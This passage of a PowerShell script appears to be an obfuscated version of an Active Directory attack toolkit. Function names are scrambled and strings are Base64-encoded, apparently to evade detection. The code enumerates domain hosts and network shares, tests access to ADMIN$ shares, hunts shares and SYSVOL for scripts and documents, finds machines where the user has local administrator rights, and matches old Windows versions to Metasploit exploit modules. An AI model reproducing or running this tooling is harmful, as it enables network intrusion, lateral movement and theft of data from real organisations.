            $ExcludedShares = @('', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA='))), "C$", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkATgBUACQA'))))
        }
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [array]$ComputerName = @()
            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                $TargetDomains = MegatedJuloInternate | % { $_.Name }
            }
            else {
                $TargetDomains = @( (PrectusEmbakedTects).name )
            }
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += GrochoniIncunnerMoustic -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                $Shares = AglimHigedMetries -ComputerName $ComputerName
                ForEach ($Share in $Shares) {
                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAGUAcgB2AGUAcgAgAHMAaABhAHIAZQA6ACAAJABTAGgAYQByAGUA')))
                    $NetName = $Share.shi1_netname
                    $Remark = $Share.shi1_remark
                    $Path = '\\'+$ComputerName+'\'+$NetName
                    if (($NetName) -and ($NetName.trim() -ne '')) {
                        if($CheckAdmin) {
                            if($NetName.ToUpper() -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA')))) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAAkAE4AZQB0AE4AYQBtAGUAIAAJAC0AIAAkAFIAZQBtAGEAcgBrAA==')))
                                }
                                catch {
                                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                        }
                        elseif ($ExcludedShares -NotContains $NetName.ToUpper()) {
                            if($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAAkAE4AZQB0AE4AYQBtAGUAIAAJAC0AIAAkAFIAZQBtAGEAcgBrAA==')))
                                }
                                catch {
                                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                            else {
                                $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAAkAE4AZQB0AE4AYQBtAGUAIAAJAC0AIAAkAFIAZQBtAGEAcgBrAA==')))
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = $ExcludedShares
                'CheckAdmin' = $CheckAdmin
            }
            RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            ForEach ($Computer in $ComputerName) {
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server $Computer ($Counter of {0})" -f $($ComputerName.count))
                icm -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
    }
}
function TrandersPalizesNonrep {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,
        [Switch]
        $OfficeDocs,
        [Switch]
        $FreshEXEs,
        [String[]]
        $Terms,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,
        [String]
        $LastAccessTime,
        [String]
        $LastWriteTime,
        [String]
        $CreationTime,
        [Switch]
        $IncludeC,
        [Switch]
        $IncludeAdmin,
        [Switch]
        $ExcludeFolders,
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [String]
        $OutFile,
        [Switch]
        $NoClobber,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [Switch]
        $SearchSYSVOL,
        [ValidateRange(1,100)] 
        [Int]
        $Threads,
        [Switch]
        $UsePSDrive,
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBGAGkAbABlAEYAaQBuAGQAZQByACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        $Shares = @()
        [String[]] $ExcludedShares = @("C$", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))))
        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))))
            }
        }
        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("C$")
            }
        }
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { rd -Path $OutFile }
        }
        if ($TermList) {
            ForEach ($Term in gc -Path $TermList) {
                if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                    $Terms += $Term
                }
            }
        }
        if($ShareList) {
            ForEach ($Item in gc -Path $ShareList) {
                if (($Item -ne $Null) -and ($Item.trim() -ne '')) {
                    $Share = $Item.Split("" + "`t" + "")[0]
                    $Shares += $Share
                }
            }
        }
        else {
            if($ComputerFile) {
                $ComputerName = gc -Path $ComputerFile
            }
            if(!$ComputerName) {
                if($Domain) {
                    $TargetDomains = @($Domain)
                }
                elseif($SearchForest) {
                    $TargetDomains = MegatedJuloInternate | % { $_.Name }
                }
                else {
                    $TargetDomains = @( (PrectusEmbakedTects).name )
                }
                if($SearchSYSVOL) {
                    ForEach ($Domain in $TargetDomains) {
                        $DCSearchPath = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQARABvAG0AYQBpAG4AXABTAFkAUwBWAE8ATABcAA==')))
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAGQAZABpAG4AZwAgAHMAaABhAHIAZQAgAHMAZQBhAHIAYwBoACAAcABhAHQAaAAgACQARABDAFMAZQBhAHIAYwBoAFAAYQB0AGgA')))
                        $Shares += $DCSearchPath
                    }
                    if(!$Terms) {
                        $Terms = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AGIAcwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAdAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHMAMQA='))))
                    }
                }
                else {
                    [array]$ComputerName = @()
                    ForEach ($Domain in $TargetDomains) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                        $ComputerName += GrochoniIncunnerMoustic -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                    }
                    $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
                    if($($ComputerName.Count) -eq 0) {
                        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
                    }
                }
            }
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential)
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAOgAgACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBkAFMAaABhAHIAZQBzADoAIAAkAEUAeABjAGwAdQBkAGUAZABTAGgAYQByAGUAcwA=')))
            $SearchShares = @()
            if($ComputerName.StartsWith("\\")) {
                $SearchShares += $ComputerName
            }
            else {
                $Up = $True
                if($Ping) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if($Up) {
                    $Shares = AglimHigedMetries -ComputerName $ComputerName
                    ForEach ($Share in $Shares) {
                        $NetName = $Share.shi1_netname
                        $Path = '\\'+$ComputerName+'\'+$NetName
                        if (($NetName) -and ($NetName.trim() -ne '')) {
                            if ($ExcludedShares -NotContains $NetName.ToUpper()) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $SearchShares += $Path
                                }
                                catch {
                                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
                                }
                            }
                        }
                    }
                }
            }
            ForEach($Share in $SearchShares) {
                $SearchArgs =  @{
                    'Path' = $Share
                    'Terms' = $Terms
                    'OfficeDocs' = $OfficeDocs
                    'FreshEXEs' = $FreshEXEs
                    'LastAccessTime' = $LastAccessTime
                    'LastWriteTime' = $LastWriteTime
                    'CreationTime' = $CreationTime
                    'ExcludeFolders' = $ExcludeFolders
                    'ExcludeHidden' = $ExcludeHidden
                    'CheckWriteAccess' = $CheckWriteAccess
                    'OutFile' = $OutFile
                    'UsePSDrive' = $UsePSDrive
                    'Credential' = $Credential
                }
                InfutumGirozoSynther @SearchArgs
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = $ExcludedShares
                'Terms' = $Terms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
                'UsePSDrive' = $UsePSDrive
                'Credential' = $Credential
            }
            if($Shares) {
                RableBelfTranks -ComputerName $Shares -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }
            else {
                RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }        
        }
        else {
            if($Shares){
                $ComputerName = $Shares
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            $ComputerName | ? {$_} | % {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByADoAIAAkAF8A')))
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server {1} ($Counter of {0})" -f $($ComputerName.count), $_)
                icm -ScriptBlock $HostEnumBlock -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
            }
        }
    }
}
function SeleizeFormittenClophical {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAARgBpAG4AZAAtAEwAbwBjAGEAbABBAGQAbQBpAG4AQQBjAGMAZQBzAHMAIAB3AGkAdABoACAAZABlAGwAYQB5ACAAbwBmACAAJABEAGUAbABhAHkA')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) {
            [array]$ComputerName = @()
            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                $TargetDomains = MegatedJuloInternate | % { $_.Name }
            }
            else {
                $TargetDomains = @( (PrectusEmbakedTects).name )
            }
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += GrochoniIncunnerMoustic -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping)
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                $Access = BoryStastwaySegrous -ComputerName $ComputerName
                if ($Access) {
                    $ComputerName
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
            }
            RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            ForEach ($Computer in $ComputerName) {
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server $Computer ($Counter of {0})" -f $($ComputerName.count))
                icm -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}
function PredMesCaria {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',
        [String]
        $SPN,
        [String]
        $OperatingSystem = '*',
        [String]
        $ServicePack = '*',
        [String]
        $Filter,
        [Switch]
        $Ping,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $Unconstrained,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABHAHIAYQBiAGIAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAIABhAGMAYwBvAHUAbgB0AHMAIABmAHIAbwBtACAAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAuAC4ALgA=')))
    $TableAdsComputers = New-Object System.Data.DataTable 
    $Null = $TableAdsComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))))       
    $Null = $TableAdsComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A'))))
    $Null = $TableAdsComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = $TableAdsComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
    GrochoniIncunnerMoustic -FullData @PSBoundParameters | % {
        $CurrentHost = $_.dnshostname
        $CurrentOs = $_.operatingsystem
        $CurrentSp = $_.operatingsystemservicepack
        $CurrentLast = $_.lastlogon
        $CurrentUac = $_.useraccountcontrol
        $CurrentUacBin = [convert]::ToString($_.useraccountcontrol,2)
        $DisableOffset = $CurrentUacBin.Length - 2
        $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)
        if ($CurrentDisabled  -eq 0) {
            $Null = $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast)
        }
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABMAG8AYQBkAGkAbgBnACAAZQB4AHAAbABvAGkAdAAgAGwAaQBzAHQAIABmAG8AcgAgAGMAcgBpAHQAaQBjAGEAbAAgAG0AaQBzAHMAaQBuAGcAIABwAGEAdABjAGgAZQBzAC4ALgAuAA==')))
    $TableExploits = New-Object System.Data.DataTable 
    $Null = $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) 
    $Null = $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA'))))  
    $Null = $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA'))))
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgADcA'))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
